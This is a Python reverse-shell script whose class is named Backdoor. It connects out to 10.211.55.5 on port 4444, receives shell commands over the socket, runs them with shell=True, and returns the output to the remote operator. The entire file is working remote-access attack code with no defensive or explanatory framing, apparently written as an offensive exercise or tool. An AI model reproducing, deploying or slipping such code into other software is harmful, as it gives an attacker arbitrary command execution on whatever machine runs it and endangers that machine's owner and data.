import subprocess, sys, socket


class Backdoor:
    def __init__(self,ip,port):
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.s.connect((str(ip),port))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def executeCmd(self,cmd):
        cmd = subprocess.check_output(cmd,shell=True)
        return cmd


    def run(self):
        while True:
            cmdIn = self.s.recv(1024)
            cmdIn = cmdIn.decode()
            #print(cmdIn)
            try:
                cmdOut = self.executeCmd(cmdIn)
                self.s.send(str(cmdOut).encode('utf-8'))
            except subprocess.CalledProcessError:
                self.s.send(b'Subprocess Error, shell command not accepted by target')


backdoor = Backdoor('10.211.55.5',4444)


try:
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()

